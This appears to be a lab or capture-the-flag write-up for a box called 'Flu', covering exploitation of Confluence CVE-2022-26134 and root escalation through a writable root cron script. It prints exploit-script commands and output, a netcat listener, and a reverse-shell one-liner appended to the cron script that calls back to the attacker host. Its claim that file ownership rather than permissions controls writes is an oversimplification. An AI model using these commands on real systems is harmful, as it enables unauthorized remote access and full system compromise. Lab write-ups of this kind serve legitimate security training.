#Linux #AtlassianConfluence #CVE #RCE #pspy #cron #WritableCronScript

## Overview

Flu is a Linux box running Atlassian Confluence 7.13.6 on port 8090. That version is vulnerable to CVE-2022-26134, an unauthenticated OGNL injection that gives remote code execution. A purpose-built exploit script delivers a reverse shell as `confluence`. Privilege escalation comes from a root-owned cron job that runs `/opt/log-backup.sh` every minute, a script owned by the `confluence` user, making it directly writable. Appending a reverse shell to the script gets root execution within the minute.

## Recon

### Nmap

```sh
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 9.0p1 Ubuntu 1ubuntu8.5
8090/tcp open  opsmessaging?
| fingerprint-strings:
|   GetRequest:
|     Location: http://localhost:8090/login.action?os_destination=%2Findex.action
```

The redirect to `login.action` identifies Atlassian Confluence immediately. The Nmap fingerprint doesn't name it, but the URL pattern is unmistakable.

### Confluence Version

The login page confirms:

```
Powered by Atlassian Confluence 7.13.6
```

Searching for this version reveals **CVE-2022-26134**, an unauthenticated remote code execution via OGNL template injection in the `/${...}` URI parameter.

## Foothold

### CVE-2022-26134, Unauthenticated OGNL Injection

A quick PoC confirms code execution:

```sh
python3 CVE-2022-26134.py http://192.168.183.41:8090/ id
Confluence target version: 7.13.6
uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)
```

> **How CVE-2022-26134 works:** Confluence evaluates OGNL (Object-Graph Navigation Language) expressions embedded in HTTP request URIs when processing certain endpoints. The `${...}` syntax in the URI is passed to the OGNL interpreter before authentication is checked, allowing arbitrary Java method invocation, including `Runtime.exec()`. No credentials, no session, no login required.

Standard reverse shell payloads failed with the basic PoC. A dedicated exploit with a built-in reverse shell function works:

```sh
python3 through_the_wire.py --rhost 192.168.183.41 --rport 8090 --lhost 192.168.45.244 --lport 443 --protocol http:// --reverse-shell

[+] Forking a netcat listener
[+] Generating a reverse shell payload
[+] Sending exploit at http://192.168.183.41:8090/
listening on [any] 443 ...
connect to [192.168.45.244] from (UNKNOWN) [192.168.183.41] 58130

confluence@flu:/opt/atlassian/confluence/bin$ whoami
confluence
```

Local flag retrieved:

```sh
confluence@flu:/home/confluence$ cat local.txt
‹redacted›
```

## Privilege Escalation

### Writable Cron Script Running as Root

LinPEAS doesn't surface obvious privesc paths, but `pspy` (a process monitor that watches fork/exec events without root) reveals a recurring root command:

```sh
2024/07/15 15:41:01 CMD: UID=0  PID=25472  | /bin/sh -c /opt/log-backup.sh
2024/07/15 15:41:01 CMD: UID=0  PID=25474  | /bin/bash /opt/log-backup.sh
```

Checking the script permissions:

```sh
-rwxr-xr-x  1 confluence confluence  408 Dec 12  2023 log-backup.sh
```

The script is owned by `confluence` with write permissions, the current user can modify it freely. The script itself:

```sh
#!/bin/bash
CONFLUENCE_HOME="/opt/atlassian/confluence/"
LOG_DIR="$CONFLUENCE_HOME/logs"
BACKUP_DIR="/root/backup"
TIMESTAMP=$(date "+%Y%m%d%H%M%S")

cp -r $LOG_DIR $BACKUP_DIR/log_backup_$TIMESTAMP
tar -czf $BACKUP_DIR/log_backup_$TIMESTAMP.tar.gz $BACKUP_DIR/log_backup_$TIMESTAMP
find $BACKUP_DIR -name "log_backup_*" -mmin +5 -exec rm -rf {} \;
```

> **Why owning the script file beats everything else:** Linux file permissions check who owns the file to determine who can write to it. Even though root executes `/opt/log-backup.sh`, the file's owner is `confluence`. The running process's identity (root) is irrelevant for the write permission check, only the file owner matters. So `confluence` can overwrite the contents of a script that root will execute on the next cron tick.

Append a reverse shell to the script:

```sh
echo 'sh -i >& /dev/tcp/192.168.45.244/53 0>&1' >> /opt/log-backup.sh
```

Set up the listener and wait less than a minute:

```sh
rlwrap nc -lvnp 53
connect to [192.168.45.244] from (UNKNOWN) [192.168.183.41] 33182
# whoami
root
```

## Root

```sh
# cat proof.txt
‹redacted›
```

## Takeaways

- **CVE-2022-26134 is pre-auth.** No credentials needed to get a shell on unpatched Confluence, version identification alone closes the loop from discovery to RCE.
- **`pspy` finds privesc paths that LinPEAS misses.** Static analysis tools look at file permissions and SUID bits. `pspy` watches what actually runs, catching cron jobs that execute scripts in non-standard locations.
- **File ownership, not file permissions, controls who can write.** A root-executed script is only protected if root owns it. Leaving ownership with a service user (like `confluence`) means the service user can rewrite it.
- **Always check script ownership after finding a root cron job.** The combination of "root runs this" and "non-root owns the file" is an immediate privesc.
